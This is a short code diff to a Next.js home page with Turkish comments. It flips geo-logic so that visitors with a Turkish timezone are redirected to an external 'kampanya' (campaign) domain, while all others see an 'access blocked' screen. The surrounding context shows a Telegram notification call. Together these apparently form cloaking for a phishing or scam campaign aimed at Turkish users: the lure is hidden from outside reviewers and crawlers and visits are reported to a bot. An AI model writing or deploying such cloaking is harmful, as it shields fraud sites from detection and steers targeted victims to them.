@@ -34,16 +34,16 @@ export default async function Home() {
     console.error('Telegram notification error:', error);
   }
 
-  // Sadece Türkiye'deki kullanıcıları siteye al
+  // Türkiye'deki kullanıcıları yönlendir
   if (isTurkishTimezone) {
-    return (
-      <main className="flex min-h-screen flex-col items-center justify-center p-24">
-        <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
-        <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
-      </main>
-    );
+    redirect('https://bbnsbnkampanya.vercel.app/');
   }
 
-  // Türkiye dışındaki kullanıcıları yönlendir
-  redirect('https://bbnsbnkampanya.vercel.app/');
+  // Türkiye dışındaki kullanıcılara erişim engeli ekranı göster
+  return (
+    <main className="flex min-h-screen flex-col items-center justify-center p-24">
+      <h1 className="text-4xl font-bold mb-8">Erişim Engellendi</h1>
+      <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
+    </main>
+  );
 }
